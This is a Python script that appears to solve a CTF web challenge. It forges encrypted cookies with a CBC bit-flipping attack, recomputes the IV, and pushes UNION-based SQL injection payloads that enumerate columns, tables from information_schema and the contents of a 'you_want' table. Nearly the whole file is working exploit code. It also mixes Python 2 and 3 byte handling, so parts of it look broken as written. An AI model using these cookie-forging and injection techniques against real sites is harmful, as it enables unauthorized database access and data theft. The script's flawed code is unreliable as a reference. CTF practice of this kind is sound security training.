import requests
import re
from base64 import *
from urllib.parse import quote,unquote

url="http://ctf5.shiyanbar.com/web/jiandan/index.php"

def find_flag(payload,cbc_flip_index,char_in_payload,char_to_replace):
	payload = {"id":payload}
	r=requests.post(url,data=payload)
	print(r)
	iv=re.findall("iv=(.*?),",r.headers['Set-Cookie'])[0]
	cipher=re.findall("cipher=(.*)",r.headers['Set-Cookie'])[0]
	print(cipher)
	cipher=unquote(cipher)
	print(cipher)
	cipher=b64decode(cipher)
	print(cipher)
	cipher_list=list(cipher)
	cipher_list[cbc_flip_index] = chr((cipher_list[cbc_flip_index])^ord(char_in_payload)^ord(char_to_replace))
	cipher_new=''.join(cipher_list)
	cipher_new=b64encode(cipher_new)
	cipher_new=quote(cipher_new)
	cookie = {'iv':iv,'cipher':cipher_new}
	r=requests.post(url,cookies=cookie)
	content = r.content
	plain_base64=re.findall("base64_decode\(\'(.*?)\'\)",content)[0]
	plain=b64decode(plain_base64)
	first_block_plain="a:1:{s:2:\"id\";s:"
	iv=unquote(iv)
	iv=b64decode(iv)
	iv_list=list(iv)
	for i in range(16):
		iv_list[i]=chr(ord(plain[i]) ^ ord(iv_list[i]) ^ ord(first_block_plain[i]))
	iv_new=''.join(iv_list)
	iv_new=b64encode(iv_new)
	iv_new=quote(iv_new)
	cookie = {'iv':iv_new,'cipher':cipher_new}
	r=requests.post(url,cookies=cookie)
	return r.content
def get_columns_count():
	table_name=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'g', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'G', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
	for i in range(len(table_name)):
		payload="(select 1)a"
		if i==0:
			payload = "0 2nion select * from("+payload+");"+chr(0);
			content=find_flag(payload,6,'2','u')
			resp=re.findall(".*(Hello!)(\d).*",content)
			if resp:
				print("table has 1 column and response position is 1")
				return payload
			else:
				print("table does not have %d columns" % (i+1))
			continue
		for t in range(i):
			payload=payload+" join (select %d)%s" % (t+2,table_name[t+1])
		payload = "0 2nion select * from("+payload+");"+chr(0);
		content=find_flag(payload,6,'2','u')
		resp=re.findall(".*(Hello!)(\d).*",content)
		if resp:
			print( "table has %d column and response position is %s" % (i+1,resp[0][1]))
			return payload
		else:
			print ("table does not have %d columns" % (i+1))
payload=get_columns_count()
print (payload)
print (find_flag('12',4,'2','#'))
print (find_flag('0 2nion select * from((select 1)a);'+chr(0),6,'2','u'))
print (find_flag('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u'))
print (find_flag('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u'))
print (find_flag("0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);"+chr(0),7,'2','u'))
print (find_flag("0 2nion select * from((select 1)a join (select value from you_want)b join (select 3)c);"+chr(0),6,'2','u'))
